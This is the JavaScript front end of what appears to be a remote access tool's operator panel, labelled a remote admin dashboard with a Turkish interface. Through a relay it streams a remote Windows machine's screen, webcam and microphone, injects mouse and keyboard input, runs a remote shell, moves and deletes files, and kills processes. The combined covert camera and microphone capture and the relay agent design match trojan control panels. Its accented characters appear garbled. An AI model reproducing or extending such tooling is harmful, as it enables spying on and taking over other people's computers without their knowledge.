// =============================================================================
// app.js â€” Remote Admin Web Dashboard (Relay Version)
// Connects to relay server at /control WebSocket endpoint
// =============================================================================

'use strict';

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Protocol constants (match protocol.h)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const CMD = {
  SCREEN_START:0x01,SCREEN_STOP:0x02,SCREEN_FRAME:0x03,SCREEN_QUALITY:0x04,
  MOUSE_MOVE:0x10,MOUSE_CLICK:0x11,MOUSE_SCROLL:0x12,KEY_EVENT:0x13,
  SHELL_START:0x20,SHELL_INPUT:0x21,SHELL_OUTPUT:0x22,SHELL_STOP:0x23,
  FILE_LIST_REQ:0x30,FILE_LIST_RESP:0x31,
  FILE_DOWNLOAD_REQ:0x32,FILE_DOWNLOAD_DATA:0x33,FILE_DOWNLOAD_END:0x34,
  FILE_UPLOAD_START:0x35,FILE_UPLOAD_DATA:0x36,FILE_UPLOAD_END:0x37,
  FILE_DELETE:0x38,FILE_MKDIR:0x39,FILE_ACK:0x3F,
  CAMERA_START:0x40,CAMERA_STOP:0x41,CAMERA_FRAME:0x42,
  MIC_START:0x50,MIC_STOP:0x51,MIC_DATA:0x52,
  PROC_LIST_REQ:0x60,PROC_LIST_RESP:0x61,PROC_KILL:0x62,PROC_PRIO:0x63,
  PING:0xF0,PONG:0xF1,DISCONNECT:0xFF,
};
const HEADER_SIZE = 5;

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// State
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let ws=null, connected=false, agentOnline=false;
let screenActive=false, cameraActive=false, micActive=false, shellActive=false, inputEnabled=false;
let pingInterval=null, pingSent=0, fpsCounter=0;
let dlChunks=[], dlFilename='';
let audioCtx=null;
let currentPath='C:\\';
let procData=[], procSortKey='mem', procSortAsc=false;

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// DOM
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const $=id=>document.getElementById(id);
const screenCanvas=$('screenCanvas'), screenCtx=screenCanvas.getContext('2d');
const cameraCanvas=$('cameraCanvas'), cameraCtx=cameraCanvas.getContext('2d');
const micCanvas=$('micCanvas'), micCtx=micCanvas.getContext('2d');
const micLevelFill=$('micLevelFill'), micLabel=$('micLabel');
const termOutput=$('terminalOutput'), termInput=$('terminalInput');
const fileList=$('fileList'), pathBar=$('pathBar'), procBody=$('procBody');
const statusDot=$('statusDot'), statusText=$('statusText');
const pingBadge=$('pingBadge'), fpsInfo=$('fpsInfo');
const agentBadge=$('agentBadge');

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Packet helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function buildPacket(cmd, payload) {
  const size = payload ? (payload.byteLength ?? payload.length) : 0;
  const buf  = new ArrayBuffer(HEADER_SIZE + size);
  const v    = new DataView(buf);
  v.setUint8(0, cmd);
  v.setUint32(1, size, true);
  if (payload && size > 0) {
    new Uint8Array(buf, HEADER_SIZE).set(
      payload instanceof ArrayBuffer ? new Uint8Array(payload) :
      payload instanceof Uint8Array  ? payload :
      new TextEncoder().encode(payload)
    );
  }
  return buf;
}

function send(cmd, payload) {
  if (ws && ws.readyState === WebSocket.OPEN && agentOnline)
    ws.send(buildPacket(cmd, payload));
}
function sendStr(cmd, str) { send(cmd, new TextEncoder().encode(str)); }

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// WebSocket â€” connects to relay /control
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function connect() {
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  const url   = `${proto}//${location.host}/control`;

  setStatus('connecting');
  ws = new WebSocket(url);
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => {
    connected = true;
    setStatus('connected');
    toast('Sunucuya baÄŸlandÄ±', 'success');
    startPing();
  };

  ws.onclose = () => {
    connected = false; agentOnline = false;
    setStatus('disconnected');
    setAgentStatus(false);
    clearInterval(pingInterval);
    showScreenPlaceholder(true);
    showCameraPlaceholder(true);
    toast('BaÄŸlantÄ± kesildi â€” yeniden baÄŸlanÄ±yor...', 'error');
    setTimeout(connect, 3000);
  };

  ws.onerror = () => setStatus('error');

  ws.onmessage = e => {
    // Status JSON message from relay
    if (typeof e.data === 'string') {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === 'status') {
          agentOnline = msg.agentConnected;
          setAgentStatus(agentOnline, msg.agentIp, msg.connectedAt);
        }
      } catch {}
      return;
    }
    handleBinary(e.data);
  };
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Binary dispatch
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function handleBinary(ab) {
  if (ab.byteLength < HEADER_SIZE) return;
  const v    = new DataView(ab);
  const cmd  = v.getUint8(0);
  const size = v.getUint32(1, true);
  const payload = ab.byteLength > HEADER_SIZE ? ab.slice(HEADER_SIZE) : null;

  switch(cmd) {
    case CMD.SCREEN_FRAME:
      renderJpeg(payload, screenCanvas, screenCtx);
      if (screenCanvas.style.display==='none') showScreenPlaceholder(false);
      fpsCounter++;
      break;
    case CMD.CAMERA_FRAME:
      renderJpeg(payload, cameraCanvas, cameraCtx);
      if (cameraCanvas.style.display==='none') showCameraPlaceholder(false);
      break;
    case CMD.MIC_DATA:     handleMicData(payload); break;
    case CMD.SHELL_OUTPUT: appendTerminal(new TextDecoder().decode(payload)); break;
    case CMD.FILE_LIST_RESP:    renderFileList(payload); break;
    case CMD.FILE_DOWNLOAD_DATA: dlChunks.push(new Uint8Array(payload)); break;
    case CMD.FILE_DOWNLOAD_END:  finishDownload(); break;
    case CMD.PROC_LIST_RESP:    renderProcessList(payload); break;
    case CMD.FILE_ACK: {
      const ok = payload && new Uint8Array(payload)[0]===0;
      toast(ok ? 'âœ“ BaÅŸarÄ±lÄ±' : 'âœ— BaÅŸarÄ±sÄ±z', ok ? 'success' : 'error');
      break;
    }
    case CMD.PONG: pingBadge.textContent=`${Date.now()-pingSent} ms`; break;
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Screen rendering
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderJpeg(ab, canvas, ctx) {
  const url=URL.createObjectURL(new Blob([ab],{type:'image/jpeg'}));
  const img=new Image();
  img.onload=()=>{ canvas.width=img.width; canvas.height=img.height; ctx.drawImage(img,0,0); URL.revokeObjectURL(url); };
  img.src=url;
}
function showScreenPlaceholder(show) {
  $('screenPlaceholder').style.display = show?'flex':'none';
  screenCanvas.style.display           = show?'none':'block';
}
function showCameraPlaceholder(show) {
  $('cameraPlaceholder').style.display = show?'flex':'none';
  cameraCanvas.style.display           = show?'none':'block';
}
setInterval(()=>{ fpsInfo.textContent=`${fpsCounter} fps`; fpsCounter=0; },1000);

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Mouse / Keyboard passthrough
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
screenCanvas.addEventListener('mousemove',e=>{
  if(!inputEnabled||!agentOnline) return;
  const r=screenCanvas.getBoundingClientRect();
  const x=Math.round((e.clientX-r.left)*(screenCanvas.width/r.width));
  const y=Math.round((e.clientY-r.top)*(screenCanvas.height/r.height));
  const b=new DataView(new ArrayBuffer(8));
  b.setInt32(0,x,true); b.setInt32(4,y,true);
  send(CMD.MOUSE_MOVE,b.buffer);
});

function sendMouseClick(e,action){
  const r=screenCanvas.getBoundingClientRect();
  const x=Math.round((e.clientX-r.left)*(screenCanvas.width/r.width));
  const y=Math.round((e.clientY-r.top)*(screenCanvas.height/r.height));
  const btn=e.button===2?1:e.button===1?2:0;
  const b=new DataView(new ArrayBuffer(10));
  b.setInt32(0,x,true); b.setInt32(4,y,true); b.setUint8(8,btn); b.setUint8(9,action);
  send(CMD.MOUSE_CLICK,b.buffer);
}
screenCanvas.addEventListener('mousedown',e=>{ if(inputEnabled&&agentOnline) sendMouseClick(e,0); });
screenCanvas.addEventListener('mouseup',  e=>{ if(inputEnabled&&agentOnline) sendMouseClick(e,1); });
screenCanvas.addEventListener('dblclick', e=>{ if(inputEnabled&&agentOnline) sendMouseClick(e,2); });
screenCanvas.addEventListener('wheel',e=>{
  if(!inputEnabled||!agentOnline) return;
  e.preventDefault();
  const r=screenCanvas.getBoundingClientRect();
  const x=Math.round((e.clientX-r.left)*(screenCanvas.width/r.width));
  const y=Math.round((e.clientY-r.top)*(screenCanvas.height/r.height));
  const b=new DataView(new ArrayBuffer(12));
  b.setInt32(0,x,true); b.setInt32(4,y,true); b.setInt32(8,Math.round(-e.deltaY/3),true);
  send(CMD.MOUSE_SCROLL,b.buffer);
},{passive:false});
screenCanvas.addEventListener('contextmenu',e=>e.preventDefault());
document.addEventListener('keydown',e=>{
  if(!inputEnabled||!agentOnline) return;
  if(document.activeElement!==document.body&&document.activeElement!==screenCanvas) return;
  e.preventDefault();
  const b=new DataView(new ArrayBuffer(5));
  b.setUint32(0,e.keyCode||e.which,true); b.setUint8(4,0);
  send(CMD.KEY_EVENT,b.buffer);
});
document.addEventListener('keyup',e=>{
  if(!inputEnabled||!agentOnline) return;
  if(document.activeElement!==document.body&&document.activeElement!==screenCanvas) return;
  const b=new DataView(new ArrayBuffer(5));
  b.setUint32(0,e.keyCode||e.which,true); b.setUint8(4,1);
  send(CMD.KEY_EVENT,b.buffer);
});

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Microphone
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function handleMicData(ab){
  const s=new Int16Array(ab);
  const W=micCanvas.width,H=micCanvas.height;
  micCtx.fillStyle='#171b24'; micCtx.fillRect(0,0,W,H);
  micCtx.beginPath(); micCtx.strokeStyle='#4c6ef5'; micCtx.lineWidth=2;
  const step=Math.max(1,Math.floor(s.length/W));
  let maxAbs=0;
  for(let i=0;i<W;i++){
    const v=s[i*step]/32768;
    maxAbs=Math.max(maxAbs,Math.abs(v));
    const y=(H/2)+v*(H/2-4);
    i===0?micCtx.moveTo(i,y):micCtx.lineTo(i,y);
  }
  micCtx.stroke();
  micLevelFill.style.width=`${Math.min(100,maxAbs*100)}%`;
  if($('chkMicPlayback').checked){
    if(!audioCtx) audioCtx=new AudioContext();
    const f32=Float32Array.from(s,v=>v/32768);
    const buf=audioCtx.createBuffer(1,f32.length,44100);
    buf.copyToChannel(f32,0);
    const src=audioCtx.createBufferSource();
    src.buffer=buf; src.connect(audioCtx.destination); src.start();
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Terminal
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function appendTerminal(text){
  termOutput.textContent+=text;
  termOutput.scrollTop=termOutput.scrollHeight;
}
termInput.addEventListener('keydown',e=>{
  if(e.key==='Enter'){
    const line=termInput.value+'\r\n';
    termInput.value='';
    appendTerminal(line);
    sendStr(CMD.SHELL_INPUT,line);
  }
});

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// File Manager
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function browseDir(path){
  currentPath=path; pathBar.textContent=path;
  sendStr(CMD.FILE_LIST_REQ,path);
}
function renderFileList(ab){
  fileList.innerHTML='';
  const view=new DataView(ab);
  let offset=0;
  const HDR=18; // 8+8+1+1
  while(offset+HDR<=ab.byteLength){
    const size=Number(view.getBigUint64(offset,true));     offset+=8;
    const mod =Number(view.getBigUint64(offset,true));     offset+=8;
    const isDir=view.getUint8(offset++);
    const nameLen=view.getUint8(offset++);
    const name=new TextDecoder().decode(ab.slice(offset,offset+nameLen)); offset+=nameLen;
    const fullPath=currentPath.replace(/\\$/,'')+'\\'+ name;
    const row=document.createElement('div'); row.className='file-row';
    const icon=isDir?'ğŸ“':getFileIcon(name);
    const sizeStr=isDir?'â€”':formatBytes(size);
    const dateStr=formatDate(mod);
    row.innerHTML=`
      <div class="file-name"><span class="file-icon">${icon}</span><span>${escHtml(name)}</span></div>
      <div class="file-size">${sizeStr}</div>
      <div class="file-date">${dateStr}</div>
      <div class="file-actions">
        ${isDir?'':`<button class="btn-icon" title="Ä°ndir" onclick="downloadFile('${escHtml(fullPath)}','${escHtml(name)}')">â¬‡</button>`}
        <button class="btn-icon" title="Sil" onclick="deleteFile('${escHtml(fullPath)}')">ğŸ—‘</button>
      </div>`;
    if(isDir) row.addEventListener('click',e=>{ if(e.target.tagName==='BUTTON') return; browseDir(fullPath); });
    fileList.appendChild(row);
  }
}
function downloadFile(path,name){
  dlChunks=[]; dlFilename=name;
  $('dlProgress').style.display='flex';
  $('dlLabel').textContent=`Ä°ndiriliyor: ${name}`;
  sendStr(CMD.FILE_DOWNLOAD_REQ,path);
}
function finishDownload(){
  if(!dlChunks.length){$('dlProgress').style.display='none';return;}
  const total=dlChunks.reduce((a,c)=>a+c.length,0);
  const merged=new Uint8Array(total);
  let off=0; for(const c of dlChunks){merged.set(c,off);off+=c.length;}
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([merged]));
  a.download=dlFilename; a.click();
  dlChunks=[]; $('dlProgress').style.display='none';
  toast(`${dlFilename} indirildi âœ“`,'success');
}
function deleteFile(path){
  if(!confirm(`Sil: ${path}?`)) return;
  sendStr(CMD.FILE_DELETE,path);
  setTimeout(()=>browseDir(currentPath),400);
}
function uploadFile(file){
  const reader=new FileReader();
  reader.onload=e=>{
    const data=new Uint8Array(e.target.result);
    const targetPath=currentPath.replace(/\\$/,'')+'\\'+ file.name;
    const pathBytes=new TextEncoder().encode(targetPath);
    const startBuf=new ArrayBuffer(9+pathBytes.length);
    const sv=new DataView(startBuf);
    sv.setBigUint64(0,BigInt(data.length),true);
    sv.setUint8(8,pathBytes.length);
    new Uint8Array(startBuf,9).set(pathBytes);
    send(CMD.FILE_UPLOAD_START,startBuf);
    const CHUNK=65536;
    for(let off=0;off<data.length;off+=CHUNK)
      send(CMD.FILE_UPLOAD_DATA,data.slice(off,off+CHUNK));
    send(CMD.FILE_UPLOAD_END);
    toast(`${file.name} yÃ¼kleniyor...`,'info');
  };
  reader.readAsArrayBuffer(file);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Process Manager
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderProcessList(ab){
  const ENTRY=88; // 4+4+4+4+8+64
  procData=[];
  const v=new DataView(ab);
  const count=Math.floor(ab.byteLength/ENTRY);
  for(let i=0;i<count;i++){
    const off=i*ENTRY;
    const nameBytes=new Uint8Array(ab,off+24,64);
    const name=new TextDecoder().decode(nameBytes).replace(/\0/g,'');
    procData.push({
      pid:v.getUint32(off,true), parent:v.getUint32(off+4,true),
      threads:v.getUint32(off+8,true), priority:v.getUint32(off+12,true),
      mem:Number(v.getBigUint64(off+16,true)), name,
    });
  }
  $('procCount').textContent=`${procData.length} sÃ¼reÃ§`;
  renderProcTable();
}
function renderProcTable(){
  const q=$('procSearch').value.toLowerCase();
  const data=procData
    .filter(p=>!q||p.name.toLowerCase().includes(q)||String(p.pid).includes(q))
    .sort((a,b)=>{
      let v=procSortKey==='name'?a.name.localeCompare(b.name):(a[procSortKey]||0)-(b[procSortKey]||0);
      return procSortAsc?v:-v;
    });
  procBody.innerHTML=data.map(p=>`<tr>
    <td>${p.pid}</td><td>${escHtml(p.name)}</td>
    <td>${formatBytes(p.mem)}</td><td>${p.threads}</td>
    <td>${priorityName(p.priority)}</td>
    <td><button class="kill-btn" onclick="killProc(${p.pid})">Kill</button></td>
  </tr>`).join('');
}
function killProc(pid){
  if(!confirm(`PID ${pid} kill?`)) return;
  const b=new DataView(new ArrayBuffer(4));
  b.setUint32(0,pid,true);
  send(CMD.PROC_KILL,b.buffer);
  setTimeout(()=>send(CMD.PROC_LIST_REQ),600);
}
function priorityName(p){
  return {0x40:'Idle',0x4000:'BelowNormal',0x20:'Normal',0x8000:'AboveNormal',0x80:'High',0x100:'Realtime'}[p]||String(p);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Ping
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function startPing(){
  clearInterval(pingInterval);
  pingInterval=setInterval(()=>{
    if(ws&&ws.readyState===WebSocket.OPEN){
      pingSent=Date.now(); send(CMD.PING);
    }
  },2000);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// UI helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function setStatus(state){
  statusDot.className='status-dot '+state;
  const labels={connecting:'Sunucuya baÄŸlanÄ±yor...',connected:'Sunucu baÄŸlÄ±',disconnected:'BaÄŸlantÄ± kesildi',error:'Hata'};
  statusText.textContent=labels[state]||state;
}

function setAgentStatus(online, ip='', connectedAt=''){
  agentBadge.textContent = online
    ? `ğŸŸ¢ Exe BaÄŸlÄ±${ip ? ' Â· '+ip : ''}`
    : 'ğŸ”´ Exe Bekleniyor';
  agentBadge.className = 'agent-badge ' + (online ? 'online' : 'offline');
}

const toastContainer=(()=>{
  const el=document.createElement('div');
  el.className='toast-container';
  document.body.appendChild(el);
  return el;
})();
function toast(msg,type='info'){
  const el=document.createElement('div');
  el.className=`toast ${type}`; el.textContent=msg;
  toastContainer.appendChild(el);
  setTimeout(()=>el.remove(),3500);
}
function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function formatBytes(b){ if(b<1024) return `${b} B`; if(b<1048576) return `${(b/1024).toFixed(1)} KB`; return `${(b/1048576).toFixed(1)} MB`; }
function formatDate(ft){ if(!ft) return 'â€”'; const ms=ft/10000-11644473600000; const d=new Date(ms); return isNaN(d)?'â€”':d.toLocaleDateString('tr-TR'); }
function getFileIcon(n){ const e=n.split('.').pop().toLowerCase(); return {exe:'âš™ï¸',dll:'âš™ï¸',bat:'ğŸ“œ',txt:'ğŸ“„',jpg:'ğŸ–¼ï¸',png:'ğŸ–¼ï¸',mp4:'ğŸ¬',mp3:'ğŸµ',zip:'ğŸ“¦',pdf:'ğŸ“•',doc:'ğŸ“˜',json:'âš¡'}[e]||'ğŸ“„'; }

// Tabs
document.querySelectorAll('.nav-btn').forEach(btn=>{
  btn.addEventListener('click',()=>{
    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    btn.classList.add('active');
    const tab=document.getElementById('tab-'+btn.dataset.tab);
    if(tab) tab.classList.add('active');
    $('pageTitle').textContent=btn.querySelector('span').textContent;
  });
});

$('hamburger').addEventListener('click',()=>{
  const sb=$('sidebar');
  if(window.innerWidth<=768) sb.classList.toggle('mobile-open');
  else sb.classList.toggle('collapsed');
});

// Controls
$('btnScreenStart').addEventListener('click',()=>send(CMD.SCREEN_START));
$('btnScreenStop').addEventListener('click',()=>{ send(CMD.SCREEN_STOP); showScreenPlaceholder(true); });
$('qualitySlider').addEventListener('input',()=>{
  const q=parseInt($('qualitySlider').value);
  $('qualityVal').textContent=q;
  send(CMD.SCREEN_QUALITY, new Uint8Array([q]));
});
$('chkInput').addEventListener('change',e=>inputEnabled=e.target.checked);

$('btnCameraStart').addEventListener('click',()=>send(CMD.CAMERA_START));
$('btnCameraStop').addEventListener('click',()=>{ send(CMD.CAMERA_STOP); showCameraPlaceholder(true); });

$('btnMicStart').addEventListener('click',()=>{
  send(CMD.MIC_START); micLabel.textContent='Mikrofon aktif ğŸ”´';
  $('micStatus').style.display='none';
});
$('btnMicStop').addEventListener('click',()=>{
  send(CMD.MIC_STOP); micLabel.textContent='Mikrofon kapalÄ±';
  $('micStatus').style.display='';
  micCtx.clearRect(0,0,micCanvas.width,micCanvas.height);
  micLevelFill.style.width='0%';
});

$('btnShellStart').addEventListener('click',()=>{ if(!shellActive){ send(CMD.SHELL_START); shellActive=true; }});
$('btnShellStop').addEventListener('click',()=>{ send(CMD.SHELL_STOP); shellActive=false; appendTerminal('\r\n[Shell durduruldu]\r\n'); });

$('btnNavUp').addEventListener('click',()=>{
  const parts=currentPath.replace(/\\$/,'').split('\\');
  if(parts.length>1){ parts.pop(); browseDir(parts.join('\\')+`\\`); }
});
$('btnRefresh').addEventListener('click',()=>browseDir(currentPath));
$('btnNewFolder').addEventListener('click',()=>{
  const name=prompt('KlasÃ¶r adÄ±:');
  if(name){ sendStr(CMD.FILE_MKDIR,currentPath.replace(/\\$/,'')+'\\'+ name); setTimeout(()=>browseDir(currentPath),400); }
});
$('btnUploadFile').addEventListener('click',()=>$('fileUploadInput').click());
$('fileUploadInput').addEventListener('change',e=>{ const f=e.target.files[0]; if(f){ uploadFile(f); e.target.value=''; }});

$('btnProcRefresh').addEventListener('click',()=>send(CMD.PROC_LIST_REQ));
$('procSearch').addEventListener('input',renderProcTable);
document.querySelectorAll('.proc-table th[data-sort]').forEach(th=>{
  th.addEventListener('click',()=>{
    const key=th.dataset.sort;
    if(procSortKey===key) procSortAsc=!procSortAsc; else{ procSortKey=key; procSortAsc=false; }
    renderProcTable();
  });
});

$('btnDisconnect').addEventListener('click',()=>{ send(CMD.DISCONNECT); ws&&ws.close(); });

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Boot
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
showScreenPlaceholder(true);
showCameraPlaceholder(true);
browseDir('C:\\');
connect();
